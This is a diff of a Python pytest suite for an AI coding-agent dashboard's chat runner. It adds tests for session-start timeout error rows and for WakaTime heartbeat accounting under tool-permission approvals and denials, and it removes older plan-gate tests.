+        with patch.object(chat_runner.KiroCrewConfig, "load", return_value=cfg):
+            await _drive(state, slot, "/quit")
+
+        state.sessions.get_or_create.assert_not_awaited()
+        assert any("not available in the dashboard" in m.get("content", "") for m in slot.messages)
+
+    @pytest.mark.asyncio
     async def test_goal_command_is_handled_locally(self, tmp_path):
         state, client = _runner_state(tmp_path)
         slot = _slot()
@@ -3477,14 +4071,18 @@ class TestRunChatRecoveryLadders:
         client.last_compaction_transient = True
         _set_stream(client, [_complete(STOP_REASON_COMPACTION_FAILED)])
 
-        await _drive(state, slot, "do the thing")
+        slot._empty_response_retries = 2
+        with _quiet_sel():
+            await chat_runner._run_chat(state, slot, "do the thing")
+        # The requeue is proven by the follow-up turn the finally DISPATCHED
+        # from it. Asserting on slot._queue cannot see it: that dispatch is the
+        # drain, so the entry is already gone by the time the turn returns. Read
+        # before settling: a settled follow-up's own tail releases slot.task.
+        assert slot.task is not None
+        await _settle(slot)
 
         assert slot._compaction_failed_retries == 1
         assert any("Compaction failed — retrying" in err for err in _errors(slot)), _errors(slot)
-        # The requeue is proven by the follow-up turn the finally DISPATCHED
-        # from it. Asserting on slot._queue cannot see it: that dispatch is the
-        # drain, so the entry is already gone by the time the turn returns.
-        assert slot.task is not None
         # Still not pipe-death: that budget and its card stay untouched.
         assert slot._acp_pipe_death_retries == 0
         assert not any("Connection lost" in err for err in _errors(slot))
@@ -4235,89 +4833,6 @@ class TestRunChatApprovalWindow:
         )
 
 
-# ── _run_chat: plan gate ──────────────────────────────────────────────────
-
-
-class TestRunChatPlanGate:
-    @pytest.mark.asyncio
-    async def test_valid_plan_arms_the_option_gate(self, tmp_path):
-        state, client = _runner_state(tmp_path)
-        slot = _slot()
-        slot.mode = "orchestrator"
-        plan = (
-            "📋 Plan for: ship it\n"
-            "Stage 1: build\n"
-            "Stage 2: verify\n"
-            "[OPTION: Go | Go All | Cancel]"
-        )
-        _set_stream(client, [LLMEvent(kind=EVENT_TEXT_CHUNK, text=plan), _complete()])
-
-        await _drive(state, slot)
-
-        assert slot._stage_titles
-
-    @pytest.mark.asyncio
-    async def test_invalid_plan_is_stripped_when_the_rephrase_fails(self, tmp_path):
-        state, client = _runner_state(tmp_path)
-        slot = _slot()
-        slot.mode = "orchestrator"
-        _set_stream(
-            client,
-            [LLMEvent(kind=EVENT_TEXT_CHUNK, text="📋 Plan for: x\nno stages here"), _complete()],
-        )
-
-        with patch.object(chat_runner, "_rephrase_plan_lite", new=AsyncMock(return_value="")):
-            await _drive(state, slot)
-
-        assert not slot._stage_titles
-
-    @pytest.mark.asyncio
-    async def test_plan_like_text_is_reformatted_by_the_rephrase_pass(self, tmp_path):
-        state, client = _runner_state(tmp_path)
-        slot = _slot()
-        slot.mode = "orchestrator"
-        good = (
-            "📋 Plan for: ship it\n"
-            "Stage 1: build\n"
-            "Stage 2: verify\n"
-            "[OPTION: Go | Go All | Cancel]"
-        )
-        _set_stream(
-            client,
-            [
-                LLMEvent(kind=EVENT_TEXT_CHUNK, text="Step 1: build\nStep 2: verify\n"),
-                _complete(),
-            ],
-        )
-
-        with (
-            patch.object(chat_runner, "looks_like_plan", return_value=True),
-            patch.object(chat_runner, "_rephrase_plan_lite", new=AsyncMock(return_value=good)),
-        ):
-            await _drive(state, slot)
-
-        assert slot._stage_titles
-
-    @pytest.mark.asyncio
-    async def test_stage_execution_turn_never_arms_a_plan(self, tmp_path):
-        """A stage turn whose output looks like a plan must not re-arm the gate."""
-        state, client = _runner_state(tmp_path)
-        slot = _slot()
-        slot.mode = "orchestrator"
-        slot._in_stage_execution = True
-        plan = (
-            "📋 Plan for: ship it\n"
-            "Stage 1: build\n"
-            "Stage 2: verify\n"
-            "[OPTION: Go | Go All | Cancel]"
-        )
-        _set_stream(client, [LLMEvent(kind=EVENT_TEXT_CHUNK, text=plan), _complete()])
-
-        await _drive(state, slot)
-
-        assert not slot._stage_titles
-
-
 def _bindings(*, kiro_agent, resolved_alias, requested_resolved):
     """Real bindings for a materialized app template or its cold fallback."""
     return ResolvedBindings(
@@ -4622,3 +5137,452 @@ class TestSessionClosingQuietAbort:
             "error card in the chat slot"
         )
         state.sessions.record_failure.assert_not_awaited()
+
+
+class TestSessionStartFailureRowKind:
+    """A session start that timed out leaves a row the Continue guard can count.
+
+    ``record_failure`` cannot count this failure: it increments a counter on the
+    REGISTERED session, and a start that never answered registered none, so the
+    call returns False and nothing anywhere remembers that the start failed.
+    The structural ``session_start_failed`` row kind is that memory -- decided
+    from the exception's tag (set at the ACP raise sites on both exception
+    families), never from the prose, so the Continue endpoint and the error card
+    can count consecutive failed starts without matching on message wording.
+    """
+
+    @pytest.mark.asyncio
+    async def test_shared_runtime_start_timeout_row_carries_the_kind(self, tmp_path):
+        from kiro_crew.acp.runtime import AcpSessionStartTimeout
+        from kiro_crew.dashboard.chat_utils import SESSION_START_FAILED_KIND
+
+        state, _client = _runner_state(tmp_path)
+        state.sessions.get_or_create = AsyncMock(
+            side_effect=AcpSessionStartTimeout(
+                "Request session/new timed out after 90s "
+                "(4/4 session-injected MCP server(s) reported)",
+                collector=None,
+            )
+        )
+        slot = _slot()
+
+        await _drive(state, slot, "hello")
+
+        error = next(row for row in slot.messages if row["role"] == "error")
+        assert "timed out after 90s" in error["content"]  # the prose is untouched
+        assert error["meta"]["kind"] == SESSION_START_FAILED_KIND
+
+    @pytest.mark.asyncio
+    async def test_an_untagged_failure_keeps_a_plain_error_row(self, tmp_path):
+        state, _client = _runner_state(tmp_path)
+        state.sessions.get_or_create = AsyncMock(side_effect=RuntimeError("something else"))
+        slot = _slot()
+
+        await _drive(state, slot, "hello")
+
+        error = next(row for row in slot.messages if row["role"] == "error")
+        assert "kind" not in (error.get("meta") or {})
+
+
+class TestRunChatWakaTimeCodingAccounting:
+    @staticmethod
+    def _wakatime_config():
+        config = chat_runner.KiroCrewConfig.load()
+        config.wakatime.enabled = True
+        config.wakatime.send_heartbeats = True
+        return config
+
+    @pytest.mark.asyncio
+    async def test_statusless_coding_call_demotes_when_permission_is_denied(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        tool_call_id = "tc-wt-denied"
+        _set_stream(
+            client,
+            [
+                _coding_tool_call(tool_call_id),
+                _permission(
+                    title="Writing the file",
+                    tool_kind="edit",
+                    tool_call_id=tool_call_id,
+                    is_shell=False,
+                ),
+                _complete(),
+            ],
+        )
+
+        def _deny_when_registered() -> None:
+            future = slot._approval_futures.get("req-cov-1")
+            if future is not None and not future.done():
+                future.set_result("rejected")
+
+        state.push_slots_update.side_effect = _deny_when_registered
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot)
+
+        client.reject_tool.assert_awaited_once_with("req-cov-1")
+        note_activity.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_statusless_coding_call_counts_after_permission_is_approved(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        tool_call_id = "tc-wt-approved"
+        _set_stream(
+            client,
+            [
+                _coding_tool_call(tool_call_id),
+                _permission(
+                    title="Writing the file",
+                    tool_kind="edit",
+                    tool_call_id=tool_call_id,
+                    is_shell=False,
+                ),
+                _complete(),
+            ],
+        )
+
+        def _approve_when_registered() -> None:
+            future = slot._approval_futures.get("req-cov-1")
+            if future is not None and not future.done():
+                future.set_result("approved")
+
+        state.push_slots_update.side_effect = _approve_when_registered
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot)
+
+        client.approve_tool.assert_awaited_once_with("req-cov-1")
+        note_activity.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_statusless_coding_call_without_permission_stays_counted(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        _set_stream(client, [_statusless_coding_tool_call(), _complete()])
+
+        config = self._wakatime_config()
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=config,
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot)
+
+        client.approve_tool.assert_not_awaited()
+        client.reject_tool.assert_not_awaited()
+        note_activity.assert_called_once()
+        assert note_activity.call_args.kwargs["config"] is config
+
+    @pytest.mark.asyncio
+    async def test_many_auto_approved_coding_calls_keep_one_turn_bit(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        events = [_statusless_coding_tool_call(f"tc-wt-{i}") for i in range(500)]
+        _set_stream(client, [*events, _complete()])
+
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot)
+
+        # Per-call ids are not retained: any number of successful coding calls
+        # collapses to one bounded bit and one turn-level heartbeat.
+        note_activity.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_denied_pending_id_is_drained_before_a_later_decision(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        tool_call_id = "tc-wt-drained"
+        _set_stream(
+            client,
+            [
+                _coding_tool_call(tool_call_id),
+                _permission(
+                    request_id="req-wt-deny",
+                    tool_call_id=tool_call_id,
+                    tool_kind="edit",
+                    is_shell=False,
+                ),
+                # No second tool call: if the first decision failed to drain the
+                # pending id, this unrelated duplicate approval would count it.
+                _permission(
+                    request_id="req-wt-later",
+                    tool_call_id=tool_call_id,
+                    tool_kind="read",
+                    is_shell=False,
+                ),
+                _complete(),
+            ],
+        )
+
+        def _decide_when_registered() -> None:
+            deny = slot._approval_futures.get("req-wt-deny")
+            if deny is not None and not deny.done():
+                deny.set_result("rejected_once")
+            approve = slot._approval_futures.get("req-wt-later")
+            if approve is not None and not approve.done():
+                approve.set_result("approved")
+
+        state.push_slots_update.side_effect = _decide_when_registered
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot)
+
+        note_activity.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_collapsed_coding_id_cannot_be_counted_by_unrelated_approval(self, tmp_path):
+        from kiro_crew.security import REDACTED_CREDENTIAL_TAG
+
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        coding_tool_call_id = "AKIAIOSFODNN7EXAMPLE"
+        _set_stream(
+            client,
+            [
+                # This non-coding call records the literal redaction tag as the
+                # first raw source. The distinct credential-shaped coding id
+                # redacts to the same key and therefore collapses its identity.
+                LLMEvent(
+                    kind=EVENT_TOOL_CALL,
+                    title="Reading the file",
+                    tool_call_id=REDACTED_CREDENTIAL_TAG,
+                    tool_kind="read",
+                    tool_name="fs_read",
+                ),
+                _coding_tool_call(coding_tool_call_id),
+                # An unrelated approval under the collapsed key must not consume
+                # and count the coding call. Its own denial follows afterward.
+                _permission(
+                    request_id="req-wt-unrelated",
+                    tool_call_id=REDACTED_CREDENTIAL_TAG,
+                    tool_kind="read",
+                    is_shell=False,
+                ),
+                _permission(
+                    request_id="req-wt-deny",
+                    tool_call_id=coding_tool_call_id,
+                    tool_kind="edit",
+                    is_shell=False,
+                ),
+                _complete(),
+            ],
+        )
+
+        def _decide_when_registered() -> None:
+            approve = slot._approval_futures.get("req-wt-unrelated")
+            if approve is not None and not approve.done():
+                approve.set_result("approved")
+            deny = slot._approval_futures.get("req-wt-deny")
+            if deny is not None and not deny.done():
+                deny.set_result("rejected_once")
+
+        state.push_slots_update.side_effect = _decide_when_registered
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot)
+
+        client.approve_tool.assert_awaited_once_with("req-wt-unrelated")
+        client.reject_tool.assert_awaited_once_with("req-wt-deny")
+        note_activity.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_restored_queued_turn_does_not_emit_heartbeat(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        _set_stream(client, [_statusless_coding_tool_call(), _complete()])
+        slot._empty_response_retries = 2
+
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+            _quiet_sel(),
+        ):
+            await chat_runner._run_chat(
+                state,
+                slot,
+                "hello",
+                _turn_provenance_restored=True,
+            )
+        await _settle(slot)
+
+        note_activity.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_mcp_name_fallback_is_not_used_by_chat_runner(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        _set_stream(
+            client,
+            [
+                _coding_tool_call(
+                    tool_kind="",
+                    tool_name="write",
+                    mcp_server_name="third-party-mcp",
+                ),
+                _complete(),
+            ],
+        )
+
+        with patch.object(chat_runner, "note_coding_activity") as note_activity:
+            await _drive(state, slot)
+
+        note_activity.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_many_undecided_pending_coding_ids_stay_capped(self, tmp_path, caplog):
+        # A flood of pending coding calls whose permission decision never
+        # arrives must not grow the retained set without bound: past the cap the
+        # key is dropped and tallied, and one summary is emitted at turn end
+        # (never a line per drop). The undecided calls reached no gating denial,
+        # so the turn does count as coding activity — the point of this test is
+        # the bound and the single summary, not suppression.
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        over_cap = chat_runner._MAX_TCID_SOURCES + 50
+        events = [_coding_tool_call(f"tc-wt-pending-{i}") for i in range(over_cap)]
+        _set_stream(client, [*events, _complete()])
+
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+            caplog.at_level("WARNING", logger=chat_runner.logger.name),
+        ):
+            await _drive(state, slot)
+
+        # Exactly one shed summary for the whole turn, not one line per dropped
+        # call — the amplified-log finding.
+        shed = [r for r in caplog.records if "wakatime pending-coding cap" in r.message]
+        assert len(shed) == 1
+        assert "shed" in shed[0].message
+        # Unguarded execution counts once for the turn.
+        note_activity.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_mcp_edit_kind_still_emits_heartbeat(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        _set_stream(
+            client,
+            [
+                _coding_tool_call(
+                    tool_kind="edit",
+                    tool_name="anything",
+                    mcp_server_name="third-party-mcp",
+                ),
+                _complete(),
+            ],
+        )
+
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot)
+
+        note_activity.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_heartbeat_uses_project_captured_at_turn_start(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        project_at_start = str(tmp_path / "project-a")
+        project_after_switch = str(tmp_path / "project-b")
+        slot.project = project_at_start
+
+        async def _events():
+            yield _statusless_coding_tool_call()
+            slot.project = project_after_switch
+            yield _complete()
+
+        client.stream = MagicMock(return_value=_events())
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot)
+
+        assert slot.project == project_after_switch
+        note_activity.assert_called_once()
+        assert note_activity.call_args.args[0] == project_at_start
+
+    @pytest.mark.asyncio
+    async def test_injected_turn_does_not_emit_heartbeat(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        client.mcp_session_report = MagicMock(return_value=None)
+        slot = _slot()
+        _set_stream(client, [_statusless_coding_tool_call(), _complete()])
+
+        with (
+            patch.object(
+                chat_runner.KiroCrewConfig,
+                "load",
+                return_value=self._wakatime_config(),
+            ),
+            patch.object(chat_runner, "note_coding_activity") as note_activity,
+        ):
+            await _drive(state, slot, _turn_actor="cron")
+
+        note_activity.assert_not_called()
